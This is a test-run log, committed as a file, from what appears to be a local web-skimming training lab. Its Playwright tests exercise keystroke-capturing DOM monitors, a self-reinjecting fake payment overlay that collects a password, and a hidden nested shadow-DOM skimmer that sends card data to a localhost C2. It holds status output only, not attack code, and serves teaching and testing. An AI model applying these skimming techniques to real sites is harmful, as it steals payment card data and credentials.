@@ -1,0 +1,1497 @@
+🧪 Test Environment: local
+📍 Home Index: http://localhost:3000
+📍 Lab 1 Vulnerable: http://localhost:9001
+📍 Lab 1 C2: http://localhost:9002
+🧪 Test environment: local
+📍 Lab 2 Vulnerable URL: http://localhost:9003
+📍 Lab 2 C2 URL: http://localhost:9004
+🧪 Test environment: local
+📍 Lab 2 Vulnerable URL: http://localhost:9003
+📍 Lab 2 C2 URL: http://localhost:9004
+🧪 Test environment: local
+📍 Lab 2 Vulnerable URL: http://localhost:9003
+📍 Lab 2 C2 URL: http://localhost:9004
+🧪 Test environment: local
+📍 Lab 2 Vulnerable URL: http://localhost:9003
+🧪 Test environment: local
+📍 Lab 2 Vulnerable URL: http://localhost:9003
+📍 Lab 2 C2 URL: http://localhost:9004
+
+Running 30 tests using 4 workers
+
+🧪 Test Environment: local
+📍 Home Index: http://localhost:3000
+📍 Lab 1 Vulnerable: http://localhost:9001
+📍 Lab 1 C2: http://localhost:9002
+🧪 Test environment: local
+📍 Lab 2 Vulnerable URL: http://localhost:9003
+📍 Lab 2 C2 URL: http://localhost:9004
+🧪 Test Environment: local
+📍 Home Index: http://localhost:3000
+📍 Lab 1 Vulnerable: http://localhost:9001
+📍 Lab 1 C2: http://localhost:9002
+🧪 Test environment: local
+📍 Lab 2 Vulnerable URL: http://localhost:9003
+📍 Lab 2 C2 URL: http://localhost:9004
+🧪 Test Environment: local
+📍 Home Index: http://localhost:3000
+📍 Lab 1 Vulnerable: http://localhost:9001
+📍 Lab 1 C2: http://localhost:9002
+🧪 Test environment: local
+📍 Lab 2 Vulnerable URL: http://localhost:9003
+📍 Lab 2 C2 URL: http://localhost:9004
+🧪 Test Environment: local
+📍 Home Index: http://localhost:3000
+📍 Lab 1 Vulnerable: http://localhost:9001
+📍 Lab 1 C2: http://localhost:9002
+🧪 Test environment: local
+📍 Lab 2 Vulnerable URL: http://localhost:9003
+📍 Lab 2 C2 URL: http://localhost:9004
+🔄 Testing dynamic form detection...
+🧪 Testing credit card exfiltration...
+⌨️ Testing real-time keystroke capture...
+🚀 Testing DOM mutation monitoring...
+🏦 LOG: [Banking] Initializing SecureBank online banking system...
+🏦 LOG: [Banking] Starting application initialization...
+🏦 LOG: [Banking] Initializing security monitoring...
+🏦 LOG: [Banking] Showing add card form
+🏦 LOG: [Banking] Application initialized successfully
+🕵️ DOM-MONITOR LOG: [DOM-Monitor] Initializing real-time field monitoring attack...
+🕵️ DOM-MONITOR LOG: [DOM-Monitor] Initializing DOM monitor attack... 
+📝 Filling out credit card form...
+✅ Submitting credit card form...
+🏦 LOG: [Banking] Processing add card...
+🏦 LOG: [Banking] Simulating add-card transaction: {cardNumber: 4532 1234 5678 9010, cardHolderName: John Doe, cardExpiry: 12/28, cvv: 123, billingZip: 12345}
+🏦 LOG: [Banking] Showing success message: Welcome back, John Doe!
+  ✘   2 [chromium] › test/tests/dom-monitor.spec.js:49:3 › DOM-Based Skimming Lab - Real-Time Field Monitor › should monitor DOM mutations and attach to new forms (4.3s)
+  ✘   4 [chromium] › test/tests/dom-monitor.spec.js:174:3 › DOM-Based Skimming Lab - Real-Time Field Monitor › should detect and monitor dynamically added forms (4.5s)
+  ✘   3 [chromium] › test/tests/dom-monitor.spec.js:109:3 › DOM-Based Skimming Lab - Real-Time Field Monitor › should capture keystrokes in real-time (5.1s)
+🏦 LOG: [Banking] add-card transaction completed successfully
+🏦 LOG: [Banking] Showing success message: Credit card added successfully
+🧪 Test Environment: local
+📍 Home Index: http://localhost:3000
+📍 Lab 1 Vulnerable: http://localhost:9001
+📍 Lab 1 C2: http://localhost:9002
+🧪 Test environment: local
+📍 Lab 2 Vulnerable URL: http://localhost:9003
+📍 Lab 2 C2 URL: http://localhost:9004
+🔍 Verifying data exfiltration to C2 server...
+📊 C2 Server Stats: {
+  totalRequests: [33m0[39m,
+  domMonitorSessions: [33m0[39m,
+  formOverlayCaptues: [33m0[39m,
+  shadowDomCaptures: [33m0[39m,
+  uniqueVictims: [33m0[39m,
+  startTime: [33m1762868679153[39m,
+  uptime: [33m798483[39m,
+  uptimeHours: [33m0.22[39m
+}
+🧪 Test Environment: local
+📍 Home Index: http://localhost:3000
+📍 Lab 1 Vulnerable: http://localhost:9001
+📍 Lab 1 C2: http://localhost:9002
+🧪 Test environment: local
+📍 Lab 2 Vulnerable URL: http://localhost:9003
+📍 Lab 2 C2 URL: http://localhost:9004
+🧪 Test Environment: local
+📍 Home Index: http://localhost:3000
+📍 Lab 1 Vulnerable: http://localhost:9001
+📍 Lab 1 C2: http://localhost:9002
+🧪 Test environment: local
+📍 Lab 2 Vulnerable URL: http://localhost:9003
+📍 Lab 2 C2 URL: http://localhost:9004
+  ✘   1 [chromium] › test/tests/cc-exfiltration.spec.js:39:3 › Lab 2: DOM-Based Skimming - Credit Card Exfiltration › should enter CC information and verify C2 server shows exfiltrated data (7.5s)
+💎 Testing high-value field immediate exfiltration...
+🔍 Analyzing DOM monitoring attack patterns...
+📤 Testing page unload data exfiltration...
+  ✘   6 [chromium] › test/tests/dom-monitor.spec.js:318:3 › DOM-Based Skimming Lab - Real-Time Field Monitor › should contain DOM monitoring attack patterns (2.4s)
+🧪 Test Environment: local
+📍 Home Index: http://localhost:3000
+📍 Lab 1 Vulnerable: http://localhost:9001
+📍 Lab 1 C2: http://localhost:9002
+🧪 Test environment: local
+📍 Lab 2 Vulnerable URL: http://localhost:9003
+📍 Lab 2 C2 URL: http://localhost:9004
+  ✘   5 [chromium] › test/tests/dom-monitor.spec.js:240:3 › DOM-Based Skimming Lab - Real-Time Field Monitor › should handle high-value field immediate exfiltration (2.6s)
+  ✘   7 [chromium] › test/tests/dom-monitor.spec.js:368:3 › DOM-Based Skimming Lab - Real-Time Field Monitor › should handle page unload data exfiltration (2.1s)
+🧪 Test Environment: local
+📍 Home Index: http://localhost:3000
+📍 Lab 1 Vulnerable: http://localhost:9001
+📍 Lab 1 C2: http://localhost:9002
+🧪 Test environment: local
+📍 Lab 2 Vulnerable URL: http://localhost:9003
+📍 Lab 2 C2 URL: http://localhost:9004
+🧪 Test Environment: local
+📍 Home Index: http://localhost:3000
+📍 Lab 1 Vulnerable: http://localhost:9001
+📍 Lab 1 C2: http://localhost:9002
+🧪 Test environment: local
+📍 Lab 2 Vulnerable URL: http://localhost:9003
+📍 Lab 2 C2 URL: http://localhost:9004
+🚀 Testing form overlay injection...
+🧪 Test Environment: local
+📍 Home Index: http://localhost:3000
+📍 Lab 1 Vulnerable: http://localhost:9001
+📍 Lab 1 C2: http://localhost:9002
+🧪 Test environment: local
+📍 Lab 2 Vulnerable URL: http://localhost:9003
+📍 Lab 2 C2 URL: http://localhost:9004
+🎭 FORM-OVERLAY LOG: [Form-Overlay] Initializing form overlay injection attack...
+🎭 FORM-OVERLAY LOG: [Form-Overlay] Initializing form overlay attack... 
+🎭 FORM-OVERLAY LOG: [Form-Overlay] Scanning for target forms... 
+🎭 FORM-OVERLAY LOG: [Form-Overlay] Found 1 target forms 
+🎭 FORM-OVERLAY LOG: [Form-Overlay] Found 1 target forms, preparing overlay injection... 
+⏳ Waiting for overlay injection delay...
+🎣 Testing credential capture through overlay...
+🎨 Testing form-specific overlay customization...
+🎭 FORM-OVERLAY LOG: [Form-Overlay] Injecting form overlay... 
+🎭 FORM-OVERLAY LOG: [Form-Overlay] Creating overlay for form type: payment 
+🎭 FORM-OVERLAY LOG: [Form-Overlay] Form overlay injected successfully 
+🔄 Testing overlay persistence mechanisms...
+🎭 FORM-OVERLAY LOG: [Form-Overlay] Initializing form overlay injection attack...
+🎭 FORM-OVERLAY LOG: [Form-Overlay] Initializing form overlay attack... 
+🎭 FORM-OVERLAY LOG: [Form-Overlay] Initializing form overlay injection attack...
+🎭 FORM-OVERLAY LOG: [Form-Overlay] Initializing form overlay attack... 
+🧪 Testing transfer form overlay...
+🎭 FORM-OVERLAY LOG: [Form-Overlay] Initializing form overlay injection attack...
+🎭 FORM-OVERLAY LOG: [Form-Overlay] Initializing form overlay attack... 
+🎭 FORM-OVERLAY LOG: [Form-Overlay] Scanning for target forms... 
+🎭 FORM-OVERLAY LOG: [Form-Overlay] Found 1 target forms 
+🎭 FORM-OVERLAY LOG: [Form-Overlay] Found 1 target forms, preparing overlay injection... 
+🎭 FORM-OVERLAY LOG: [Form-Overlay] Scanning for target forms... 
+🎭 FORM-OVERLAY LOG: [Form-Overlay] Found 2 target forms 
+🎭 FORM-OVERLAY LOG: [Form-Overlay] Found 2 target forms, preparing overlay injection... 
+🎭 FORM-OVERLAY LOG: [Form-Overlay] Scanning for target forms... 
+🎭 FORM-OVERLAY LOG: [Form-Overlay] Found 2 target forms 
+🎭 FORM-OVERLAY LOG: [Form-Overlay] Found 2 target forms, preparing overlay injection... 
+🎭 Overlay injection status: [33mtrue[39m
+✅ Form overlay successfully injected
+👻 Original form hidden status: [33mfalse[39m
+  ✘   8 [chromium] › test/tests/form-overlay.spec.js:49:3 › DOM-Based Skimming Lab - Form Overlay Injection › should inject overlay on high-priority forms (7.1s)
+⚠️ No overlay appeared for transfer section
+🧪 Testing payments form overlay...
+🎭 FORM-OVERLAY LOG: [Form-Overlay] Injecting form overlay... 
+🎭 FORM-OVERLAY LOG: [Form-Overlay] Creating overlay for form type: payment 
+🎭 FORM-OVERLAY LOG: [Form-Overlay] Form overlay injected successfully 
+🎭 FORM-OVERLAY LOG: [Form-Overlay] Injecting form overlay... 
+🎭 FORM-OVERLAY LOG: [Form-Overlay] Creating overlay for form type: financial 
+🎭 FORM-OVERLAY LOG: [Form-Overlay] Form overlay injected successfully 
+🎭 FORM-OVERLAY LOG: [Form-Overlay] Injecting form overlay... 
+🎭 FORM-OVERLAY LOG: [Form-Overlay] Creating overlay for form type: financial 
+🎭 FORM-OVERLAY LOG: [Form-Overlay] Form overlay injected successfully 
+🎭 Overlay detected, filling fake form...
+🔐 Password entered in overlay
+🧪 Test Environment: local
+📍 Home Index: http://localhost:3000
+📍 Lab 1 Vulnerable: http://localhost:9001
+📍 Lab 1 C2: http://localhost:9002
+🧪 Test environment: local
+📍 Lab 2 Vulnerable URL: http://localhost:9003
+📍 Lab 2 C2 URL: http://localhost:9004
+🎭 Initial overlay detected
+🎭 FORM-OVERLAY LOG: [Form-Overlay] Overlay removal detected, re-injecting... 
+🗑️ Overlay manually removed
+  ✘   9 [chromium] › test/tests/form-overlay.spec.js:98:3 › DOM-Based Skimming Lab - Form Overlay Injection › should capture credentials through fake overlay (6.6s)
+📝 Overlay title for payments: ⚠️ Transaction Verification
+🔍 Analyzing form overlay attack patterns...
+  ✘  10 [chromium] › test/tests/form-overlay.spec.js:201:3 › DOM-Based Skimming Lab - Form Overlay Injection › should show appropriate overlay for different form types (7.3s)
+🎭 FORM-OVERLAY LOG: [Form-Overlay] Initializing form overlay injection attack...
+🎭 FORM-OVERLAY LOG: [Form-Overlay] Initializing form overlay attack... 
+🧪 Test Environment: local
+📍 Home Index: http://localhost:3000
+📍 Lab 1 Vulnerable: http://localhost:9001
+📍 Lab 1 C2: http://localhost:9002
+🧪 Test environment: local
+📍 Lab 2 Vulnerable URL: http://localhost:9003
+📍 Lab 2 C2 URL: http://localhost:9004
+🎭 FORM-OVERLAY LOG: [Form-Overlay] Scanning for target forms... 
+🎭 FORM-OVERLAY LOG: [Form-Overlay] Found 1 target forms 
+🎭 FORM-OVERLAY LOG: [Form-Overlay] Found 1 target forms, preparing overlay injection... 
+  ✘  11 [chromium] › test/tests/form-overlay.spec.js:247:3 › DOM-Based Skimming Lab - Form Overlay Injection › should handle overlay persistence and anti-removal (8.1s)
+🧪 Test Environment: local
+📍 Home Index: http://localhost:3000
+📍 Lab 1 Vulnerable: http://localhost:9001
+📍 Lab 1 C2: http://localhost:9002
+🧪 Test environment: local
+📍 Lab 2 Vulnerable URL: http://localhost:9003
+📍 Lab 2 C2 URL: http://localhost:9004
+📊 Attack pattern analysis: {
+  formOverlayAttack: [33mtrue[39m,
+  hasMutationObserver: [33mtrue[39m,
+  hasOverlayStyles: [33mfalse[39m,
+  hasFormQueries: [33mtrue[39m,
+  hasDynamicContent: [33mtrue[39m
+}
+❌ Testing overlay cancellation and closure...
+🎭 FORM-OVERLAY LOG: [Form-Overlay] Injecting form overlay... 
+🎭 FORM-OVERLAY LOG: [Form-Overlay] Creating overlay for form type: payment 
+🎭 FORM-OVERLAY LOG: [Form-Overlay] Form overlay injected successfully 
+🎭 FORM-OVERLAY LOG: [Form-Overlay] Initializing form overlay injection attack...
+🎭 FORM-OVERLAY LOG: [Form-Overlay] Initializing form overlay attack... 
+🧪 Test Environment: local
+📍 Home Index: http://localhost:3000
+📍 Lab 1 Vulnerable: http://localhost:9001
+📍 Lab 1 C2: http://localhost:9002
+🧪 Test environment: local
+📍 Lab 2 Vulnerable URL: http://localhost:9003
+🎪 Testing social engineering elements in overlay...
+🎭 FORM-OVERLAY LOG: [Form-Overlay] Scanning for target forms... 
+🎭 FORM-OVERLAY LOG: [Form-Overlay] Found 1 target forms 
+🎭 FORM-OVERLAY LOG: [Form-Overlay] Found 1 target forms, preparing overlay injection... 
+🎭 Overlay-specific patterns: {
+  hasOverlayBackdrop: [33mtrue[39m,
+  hasOverlayStyles: [33mtrue[39m,
+  hasFormHiddenClass: [33mtrue[39m,
+  hasHighZIndex: [33mtrue[39m
+}
+✅ Form overlay attack patterns verified
+🎭 FORM-OVERLAY LOG: [Form-Overlay] Initializing form overlay injection attack...
+🎭 FORM-OVERLAY LOG: [Form-Overlay] Initializing form overlay attack... 
+  ✓  12 [chromium] › test/tests/form-overlay.spec.js:306:3 › DOM-Based Skimming Lab - Form Overlay Injection › should contain form overlay attack patterns (6.7s)
+🧪 Test environment: local
+📍 Lab 2 Vulnerable URL: http://localhost:9003
+🧪 Testing navigation buttons functionality...
+🎭 FORM-OVERLAY LOG: [Form-Overlay] Scanning for target forms... 
+🎭 FORM-OVERLAY LOG: [Form-Overlay] Found 2 target forms 
+🎭 FORM-OVERLAY LOG: [Form-Overlay] Found 2 target forms, preparing overlay injection... 
+🧪 Testing navigation buttons layout...
+🎭 FORM-OVERLAY LOG: [Form-Overlay] Injecting form overlay... 
+🎭 FORM-OVERLAY LOG: [Form-Overlay] Creating overlay for form type: payment 
+🎭 FORM-OVERLAY LOG: [Form-Overlay] Form overlay injected successfully 
+🏦 BANKING LOG: [Banking] Initializing SecureBank online banking system...
+🏦 BANKING LOG: [Banking] Starting application initialization...
+🎭 Overlay detected, testing closure mechanisms...
+🏦 BANKING LOG: [Banking] Initializing security monitoring...
+🏦 BANKING LOG: [Banking] Showing add card form
+🏦 BANKING LOG: [Banking] Application initialized successfully
+🎭 FORM-OVERLAY LOG: [Form-Overlay] Closing form overlay... 
+🎭 FORM-OVERLAY LOG: [Form-Overlay] Form overlay closed 
+🏦 BANKING LOG: [Banking] Initializing SecureBank online banking system...
+🏦 BANKING LOG: [Banking] Starting application initialization...
+🏦 BANKING LOG: [Banking] Initializing security monitoring...
+🏦 BANKING LOG: [Banking] Showing add card form
+🏦 BANKING LOG: [Banking] Application initialized successfully
+✅ Back button found with href: http://localhost:3000
+✅ View Stolen Data button found with href: http://localhost:9004
+✅ Both navigation buttons are enabled and clickable
+  ✓  16 [chromium] › test/tests/lab2-improvements.spec.js:50:3 › Lab 2: DOM-Based Skimming - UI Improvements › should have Back and View Stolen Data buttons that work (2.1s)
+✅ Navigation buttons are correctly positioned above lab tabs
+  ✓  15 [chromium] › test/tests/lab2-improvements.spec.js:25:3 › Lab 2: DOM-Based Skimming - UI Improvements › should display navigation buttons above lab page tabs (2.4s)
+🔴 Close button functionality: [33mtrue[39m
+✅ Close button working correctly
+🔄 Original form restored: [33mtrue[39m
+🧪 Testing default page is cards...
+🎭 FORM-OVERLAY LOG: [Form-Overlay] Injecting form overlay... 
+🎭 FORM-OVERLAY LOG: [Form-Overlay] Creating overlay for form type: financial 
+🎭 FORM-OVERLAY LOG: [Form-Overlay] Form overlay injected successfully 
+🧪 Testing add new card form is visible by default...
+🎭 FORM-OVERLAY LOG: [Form-Overlay] Initializing form overlay injection attack...
+🎭 FORM-OVERLAY LOG: [Form-Overlay] Initializing form overlay attack... 
+🏦 BANKING LOG: [Banking] Initializing SecureBank online banking system...
+🏦 BANKING LOG: [Banking] Starting application initialization...
+🏦 BANKING LOG: [Banking] Initializing security monitoring...
+🏦 BANKING LOG: [Banking] Showing add card form
+🏦 BANKING LOG: [Banking] Application initialized successfully
+🏦 BANKING LOG: [Banking] Initializing SecureBank online banking system...
+🏦 BANKING LOG: [Banking] Starting application initialization...
+🏦 BANKING LOG: [Banking] Initializing security monitoring...
+🏦 BANKING LOG: [Banking] Showing add card form
+🏦 BANKING LOG: [Banking] Application initialized successfully
+✅ Cards page is default on load
+  ✓  17 [chromium] › test/tests/lab2-improvements.spec.js:82:3 › Lab 2: DOM-Based Skimming - UI Improvements › should default to cards page on load (1.5s)
+🎭 Analyzing social engineering elements...
+🔐 Security notice present: [33mtrue[39m
+🔒 Security message: 
+                            🔒
+                            This is a secure transaction. Your information is encrypted.
+                        
+🏦 Bank logo present: [33mtrue[39m
+🏛️ Logo text: 🏦 SecureBank
+⚠️ Title message: ⚠️ Transaction Verification
+🚨 Urgency markers found: [33mtrue[39m
+🔒 Footer security text: 
+                        🔐 SSL Secured | SecureBank © 2024
+                    
+🎪 Social engineering analysis completed
+  ✓  14 [chromium] › test/tests/form-overlay.spec.js:444:3 › DOM-Based Skimming Lab - Form Overlay Injection › should demonstrate social engineering elements (5.9s)
+🧪 Test environment: local
+📍 Lab 2 Vulnerable URL: http://localhost:9003
+🧪 Testing add new card form is ready for user input...
+🏦 BANKING LOG: [Banking] Showing success message: Welcome back, John Doe!
+🧪 Testing Settings tab is removed...
+🏦 BANKING LOG: [Banking] Initializing SecureBank online banking system...
+🏦 BANKING LOG: [Banking] Starting application initialization...
+🏦 BANKING LOG: [Banking] Initializing security monitoring...
+🏦 BANKING LOG: [Banking] Showing add card form
+🏦 BANKING LOG: [Banking] Application initialized successfully
+🏦 BANKING LOG: [Banking] Initializing SecureBank online banking system...
+🏦 BANKING LOG: [Banking] Starting application initialization...
+🏦 BANKING LOG: [Banking] Initializing security monitoring...
+🏦 BANKING LOG: [Banking] Showing add card form
+🏦 BANKING LOG: [Banking] Application initialized successfully
+  ✘  13 [chromium] › test/tests/form-overlay.spec.js:371:3 › DOM-Based Skimming Lab - Form Overlay Injection › should handle overlay cancellation and closure (8.1s)
+✅ Settings tab has been removed
+  ✓  20 [chromium] › test/tests/lab2-improvements.spec.js:180:3 › Lab 2: DOM-Based Skimming - UI Improvements › should not have Settings tab (1.4s)
+🏦 BANKING LOG: [Banking] Showing success message: Welcome back, John Doe!
+🧪 Testing tab navigation...
+🏦 BANKING LOG: [Banking] Initializing SecureBank online banking system...
+🏦 BANKING LOG: [Banking] Starting application initialization...
+🏦 BANKING LOG: [Banking] Initializing security monitoring...
+🏦 BANKING LOG: [Banking] Showing add card form
+🏦 BANKING LOG: [Banking] Application initialized successfully
+🧪 Test Environment: local
+📍 Home Index: http://localhost:3000
+📍 Lab 1 Vulnerable: http://localhost:9001
+📍 Lab 1 C2: http://localhost:9002
+🧪 Test environment: local
+📍 Lab 2 Vulnerable URL: http://localhost:9003
+🏦 BANKING LOG: [Banking] Navigated to section: dashboard
+🏦 BANKING LOG: [Banking] Showing success message: Welcome back, John Doe!
+🏦 BANKING LOG: [Banking] Navigated to section: cards
+🏦 BANKING LOG: [Banking] Showing add card form
+✅ Tab navigation works correctly
+  ✓  21 [chromium] › test/tests/lab2-improvements.spec.js:243:3 › Lab 2: DOM-Based Skimming - UI Improvements › should navigate between tabs correctly (2.4s)
+🧪 Test environment: local
+📍 Lab 2 Vulnerable URL: http://localhost:9003
+📍 Lab 2 C2 URL: http://localhost:9004
+🚀 Testing Shadow DOM infrastructure creation...
+🧪 Testing simplified interface focused on cards...
+🏦 BANKING LOG: [Banking] Initializing SecureBank online banking system...
+🏦 BANKING LOG: [Banking] Starting application initialization...
+🏦 BANKING LOG: [Banking] Initializing security monitoring...
+🏦 BANKING LOG: [Banking] Showing add card form
+🏦 BANKING LOG: [Banking] Application initialized successfully
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Initializing Shadow DOM stealth attack...
+  ✘  18 [chromium] › test/tests/lab2-improvements.spec.js:105:3 › Lab 2: DOM-Based Skimming - UI Improvements › should show add new card form by default on cards page (6.9s)
+🏦 BANKING LOG: [Banking] Showing success message: Welcome back, John Doe!
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Initializing Shadow DOM skimmer attack... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating nested Shadow DOM structure for enhanced stealth... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869510181_f9omf26zv 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869510181_x9ilfps4p 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869510181_kj16h90cx 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869510182_kx40fdc49 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869510182_pjx7m4tta 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Created 5 nested Shadow DOM levels 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Setting up cross-shadow boundary monitoring... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Cross-boundary monitoring established 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Starting periodic shadow data exfiltration... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Initializing shadow stealth measures... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM skimmer attack initialized successfully 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-number_cardNumber_text_1762869510283_1yyr6 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-holder-name_cardHolderName_text_1762869510283_fksgh 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-expiry_cardExpiry_text_1762869510284_5c8h1 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-cvv-input_cvv_text_1762869510284_trdqz 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-cvv_cvv_text_1762869510284_2evod 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_payment-account_accountNumber_text_1762869510284_syg86 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: form
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_form_transfer-form_no-name_no-type_1762869510284_x0dhx 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: form
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_form_payment-form_no-name_no-type_1762869510285_l7501 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: form
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_form_add-card-form_no-name_no-type_1762869510285_e3k4x 
+🧪 Test Environment: local
+📍 Home Index: http://localhost:3000
+📍 Lab 1 Vulnerable: http://localhost:9001
+📍 Lab 1 C2: http://localhost:9002
+🧪 Test environment: local
+📍 Lab 2 Vulnerable URL: http://localhost:9003
+📍 Lab 2 C2 URL: http://localhost:9004
+  ✘  19 [chromium] › test/tests/lab2-improvements.spec.js:150:3 › Lab 2: DOM-Based Skimming - UI Improvements › should have add new card form waiting for user input (6.6s)
+🧪 Test Environment: local
+📍 Home Index: http://localhost:3000
+📍 Lab 1 Vulnerable: http://localhost:9001
+📍 Lab 1 C2: http://localhost:9002
+🧪 Test environment: local
+📍 Lab 2 Vulnerable URL: http://localhost:9003
+📍 Lab 2 C2 URL: http://localhost:9004
+🔍 Analyzing shadow DOM infrastructure...
+📊 Shadow attack status: {
+  active: [33mtrue[39m,
+  shadowHosts: [33m5[39m,
+  capturedSessions: [33m9[39m,
+  monitoringIntervals: [33m3[39m
+}
+✅ Shadow DOM infrastructure created successfully
+👻 Visible shadow hosts (should be 0): [33m0[39m
+👻 Shadow DOM infrastructure test completed
+  ✓  23 [chromium] › test/tests/shadow-skimmer.spec.js:49:3 › DOM-Based Skimming Lab - Shadow DOM Stealth Attack › should create hidden shadow DOM infrastructure (4.2s)
+🔄 Testing cross-shadow boundary monitoring...
+💽 Testing shadow-isolated data capture...
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Initializing Shadow DOM stealth attack...
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Initializing Shadow DOM stealth attack...
+🔒 Testing closed shadow DOM stealth capabilities...
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Initializing Shadow DOM skimmer attack... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating nested Shadow DOM structure for enhanced stealth... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869514117_96qr7vktm 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869514117_02hpm41t8 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869514117_bfastkmqm 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869514118_l46kqicer 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869514118_o2siar95s 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Created 5 nested Shadow DOM levels 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Setting up cross-shadow boundary monitoring... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Cross-boundary monitoring established 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Starting periodic shadow data exfiltration... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Initializing shadow stealth measures... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM skimmer attack initialized successfully 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-number_cardNumber_text_1762869514220_1c25a 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-holder-name_cardHolderName_text_1762869514220_etiy1 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-expiry_cardExpiry_text_1762869514220_snfal 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-cvv-input_cvv_text_1762869514220_edm96 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-cvv_cvv_text_1762869514220_w62zu 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
